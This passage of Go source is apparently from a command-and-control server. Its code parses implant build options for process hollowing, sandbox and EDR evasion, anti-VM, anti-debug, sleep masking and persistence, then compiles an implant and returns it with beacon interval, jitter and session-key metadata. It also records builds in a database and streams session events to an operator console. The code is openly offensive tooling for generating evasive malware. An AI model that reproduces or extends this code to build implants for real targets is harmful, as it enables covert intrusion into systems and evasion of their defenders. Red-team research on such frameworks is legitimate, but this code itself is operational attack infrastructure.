		// Advanced Evasion Options
		case "process_hollowing":
			config.ProcessHollowing = value == "true"
		case "anti_emulation":
			config.AntiEmulation = value == "true"
		case "sandbox_evasion":
			config.SandboxEvasion = value == "true"
		case "edr_detection":
			config.EDRDetection = value == "true"
		case "network_fingerprinting":
			config.NetworkFingerprinting = value == "true"

		// Basic Evasion (kept for compatibility)
		case "anti_vm":
			config.AntiVM = value == "true"
		case "anti_debug":
			config.AntiDebug = value == "true"
		case "sleep_mask":
			config.SleepMask = value == "true"
		case "persistent_mode":
			config.PersistentMode = value == "true"
		}
	}

	// Apply obfuscation defaults if level is specified
	s.generator.setObfuscationDefaults(config)

	// Log detailed configuration before generation
	var configDetails []string

	// Basic options
	if config.Debug {
		configDetails = append(configDetails, "debug=true")
	}
	if config.Obfuscate {
		configDetails = append(configDetails, "obfuscation=true")
	}
	if config.Garble {
		configDetails = append(configDetails, "garble=true")
	}

	// Enhanced obfuscation
	if config.ObfuscationLevel > 0 {
		configDetails = append(configDetails, fmt.Sprintf("obfuscation_level=%d", config.ObfuscationLevel))
	}
	if config.StringObfuscation {
		configDetails = append(configDetails, "string_obf=true")
	}
	if config.NameObfuscation {
		configDetails = append(configDetails, "name_obf=true")
	}
	if config.ControlFlowObfuscation {
		configDetails = append(configDetails, "control_flow_obf=true")
	}
	if config.APIObfuscation {
		configDetails = append(configDetails, "api_obf=true")
	}
	if config.NetworkObfuscation {
		configDetails = append(configDetails, "network_obf=true")
	}
	if config.RuntimePacking {
		configDetails = append(configDetails, "runtime_packing=true")
	}
	if config.UPXPacking {
		configDetails = append(configDetails, "upx_packing=true")
	}
	if config.FakeResources {
		configDetails = append(configDetails, "fake_resources=true")
	}

	// Advanced evasion
	if config.ProcessHollowing {
		configDetails = append(configDetails, "process_hollowing=true")
	}
	if config.AntiEmulation {
		configDetails = append(configDetails, "anti_emulation=true")
	}
	if config.SandboxEvasion {
		configDetails = append(configDetails, "sandbox_evasion=true")
	}
	if config.EDRDetection {
		configDetails = append(configDetails, "edr_detection=true")
	}
	if config.NetworkFingerprinting {
		configDetails = append(configDetails, "network_fingerprinting=true")
	}

	// Basic evasion
	if config.AntiVM {
		configDetails = append(configDetails, "anti-vm=true")
	}
	if config.AntiDebug {
		configDetails = append(configDetails, "anti-debug=true")
	}
	if config.SleepMask {
		configDetails = append(configDetails, "sleep-mask=true")
	}

	if len(configDetails) > 0 {
		logrus.Infof("Implant build configuration: %s", strings.Join(configDetails, ", "))
	}
	logrus.Infof("Target configuration: %s:%d (%s transport)", config.ServerAddr, config.Port, config.Transport)

	// Generate the implant using our new generator
	startTime := time.Now()
	binaryPath, err := s.generator.GenerateImplant(config)
	buildDuration := time.Since(startTime)

	if err != nil {
		logrus.Errorf("Failed to generate implant after %v: %v", buildDuration, err)
		return &pb.ImplantGenerationResponse{
			Success: false,
			Message: fmt.Sprintf("Generation failed: %v", err),
		}, nil
	}

	logrus.Infof("Implant compilation completed in %v", buildDuration)

	// Read the generated binary/source
	var payload []byte
	var filename string

	if req.Format == "source" || req.Format == "go" {
		// Return source code instead of binary
		sourcePath := strings.TrimSuffix(binaryPath, filepath.Ext(binaryPath)) + ".go"
		payload, err = os.ReadFile(sourcePath)
		filename = filepath.Base(sourcePath)
	} else {
		// Return binary
		payload, err = os.ReadFile(binaryPath)
		filename = filepath.Base(binaryPath)
	}

	if err != nil {
		logrus.Errorf("Failed to read generated file: %v", err)
		return &pb.ImplantGenerationResponse{
			Success: false,
			Message: fmt.Sprintf("Failed to read generated file: %v", err),
		}, nil
	}

	// Create response config
	respConfig := &pb.ImplantConfig{
		ServerAddress: fmt.Sprintf("%s:%d", config.ServerAddr, config.Port),
		TransportType: config.Transport,
		SkipVerify:    config.SkipTLSVerify,
		Metadata: map[string]string{
			"listener_id":     config.ListenerID,
			"session_key":     config.SessionKey,
			"beacon_interval": fmt.Sprintf("%d", config.BeaconInterval),
			"jitter_percent":  fmt.Sprintf("%d", config.JitterPercent),
			"generated_at":    time.Now().Format(time.RFC3339),
		},
	}

	// Calculate file size for logging
	fileSizeKB := float64(len(payload)) / 1024
	var sizeStr string
	if fileSizeKB < 1024 {
		sizeStr = fmt.Sprintf("%.1f KB", fileSizeKB)
	} else {
		sizeStr = fmt.Sprintf("%.1f MB", fileSizeKB/1024)
	}

	logrus.Infof("Successfully generated implant: %s (%s, %d bytes)", filename, sizeStr, len(payload))
	logrus.Infof("Implant metadata: beacon_interval=%ds, jitter=%d%%, session_key=%s...",
		config.BeaconInterval, config.JitterPercent, config.SessionKey[:8])

	// Save implant build information to database
	buildID := fmt.Sprintf("build_%d", time.Now().UnixNano())
	codename := shared.GenerateCodename()

	// Calculate SHA256 hash
	hash := sha256.Sum256(payload)
	sha256Hash := hex.EncodeToString(hash[:])

	// Collect obfuscation techniques applied
	var obfuscationTechs []string
	if config.Obfuscate {
		obfuscationTechs = append(obfuscationTechs, "basic_obfuscation")
	}
	if config.Garble {
		obfuscationTechs = append(obfuscationTechs, "garble")
	}
	if config.StringObfuscation {
		obfuscationTechs = append(obfuscationTechs, "string_obfuscation")
	}
	if config.NameObfuscation {
		obfuscationTechs = append(obfuscationTechs, "name_obfuscation")
	}
	if config.ControlFlowObfuscation {
		obfuscationTechs = append(obfuscationTechs, "control_flow_obfuscation")
	}
	if config.APIObfuscation {
		obfuscationTechs = append(obfuscationTechs, "api_obfuscation")
	}
	if config.NetworkObfuscation {
		obfuscationTechs = append(obfuscationTechs, "network_obfuscation")
	}
	if config.RuntimePacking {
		obfuscationTechs = append(obfuscationTechs, "runtime_packing")
	}
	if config.UPXPacking {
		obfuscationTechs = append(obfuscationTechs, "upx_packing")
	}
	if config.FakeResources {
		obfuscationTechs = append(obfuscationTechs, "fake_resources")
	}
	if config.ProcessHollowing {
		obfuscationTechs = append(obfuscationTechs, "process_hollowing")
	}
	if config.AntiEmulation {
		obfuscationTechs = append(obfuscationTechs, "anti_emulation")
	}
	if config.SandboxEvasion {
		obfuscationTechs = append(obfuscationTechs, "sandbox_evasion")
	}
	if config.EDRDetection {
		obfuscationTechs = append(obfuscationTechs, "edr_detection")
	}
	if config.NetworkFingerprinting {
		obfuscationTechs = append(obfuscationTechs, "network_fingerprinting")
	}
	if config.AntiVM {
		obfuscationTechs = append(obfuscationTechs, "anti_vm")
	}
	if config.AntiDebug {
		obfuscationTechs = append(obfuscationTechs, "anti_debug")
	}
	if config.SleepMask {
		obfuscationTechs = append(obfuscationTechs, "sleep_mask")
	}

	obfuscationTechsJSON, _ := json.Marshal(obfuscationTechs)

	// Create database record
	dbBuild := &DBImplantBuild{
		BuildID:          buildID,
		ListenerID:       config.ListenerID,
		Filename:         filename,
		Codename:         codename,
		OS:               config.OS,
		Arch:             config.Arch,
		Format:           config.Format,
		ObfuscationLevel: config.ObfuscationLevel,
		ObfuscationTechs: string(obfuscationTechsJSON),
		BuildTime:        buildDuration,
		FileSize:         int64(len(payload)),
		SHA256Hash:       sha256Hash,
		Debug:            config.Debug,
	}

	// Save to database
	if err := s.db.SaveImplantBuild(dbBuild); err != nil {
		logrus.Errorf("Failed to save implant build to database: %v", err)
		// Continue even if database save fails
	} else {
		logrus.Infof("Implant build saved to database: %s (%s)", buildID, codename)
	}

	return &pb.ImplantGenerationResponse{
		Success:  true,
		Message:  fmt.Sprintf("Implant generated successfully: %s", filename),
		Payload:  payload,
		Filename: filename,
		Config:   respConfig,
	}, nil
}

func (s *C2Server) ListImplantBuilds(ctx context.Context, req *pb.ImplantBuildsListRequest) (*pb.ImplantBuildsListResponse, error) {
	// Get all implant builds from database
	builds, err := s.db.GetAllImplantBuilds()
	if err != nil {
		logrus.Errorf("Failed to retrieve implant builds: %v", err)
		return &pb.ImplantBuildsListResponse{
			Builds: []*pb.ImplantBuildInfo{},
		}, nil
	}

	// Convert to protobuf format
	var pbBuilds []*pb.ImplantBuildInfo
	for _, build := range builds {
		// Parse obfuscation techniques from JSON
		var obfTechs []string
		if err := json.Unmarshal([]byte(build.ObfuscationTechs), &obfTechs); err != nil {
			logrus.Warnf("Failed to parse obfuscation techniques for build %s: %v", build.BuildID, err)
			obfTechs = []string{}
		}

		pbBuild := &pb.ImplantBuildInfo{
			BuildId:          build.BuildID,
			ListenerId:       build.ListenerID,
			Filename:         build.Filename,
			Codename:         build.Codename,
			Os:               build.OS,
			Arch:             build.Arch,
			Format:           build.Format,
			ObfuscationLevel: int32(build.ObfuscationLevel),
			ObfuscationTechs: obfTechs,
			BuildTimeMs:      build.BuildTime.Milliseconds(),
			FileSize:         build.FileSize,
			Sha256Hash:       build.SHA256Hash,
			Debug:            build.Debug,
			CreatedAt:        build.CreatedAt.Unix(),
		}
		pbBuilds = append(pbBuilds, pbBuild)
	}

	logrus.Infof("Retrieved %d implant builds", len(pbBuilds))
	return &pb.ImplantBuildsListResponse{
		Builds: pbBuilds,
	}, nil
}

func (s *C2Server) SessionEventStream(req *pb.SessionEventStreamRequest, stream pb.C2Service_SessionEventStreamServer) error {
	// Generate unique ID for this event stream
	streamID := fmt.Sprintf("event_stream_%d", time.Now().UnixNano())

	logrus.Infof("Console connected to session event stream: %s", streamID)

	// Store the event stream
	s.eventStreamsMux.Lock()
	s.eventStreams[streamID] = stream
	s.eventStreamsMux.Unlock()

	// Cleanup on disconnect
	defer func() {
		s.eventStreamsMux.Lock()
		delete(s.eventStreams, streamID)
		s.eventStreamsMux.Unlock()
		logrus.Infof("Console disconnected from session event stream: %s", streamID)
	}()

	// Keep the stream alive and handle context cancellation
	<-stream.Context().Done()
	return stream.Context().Err()
}
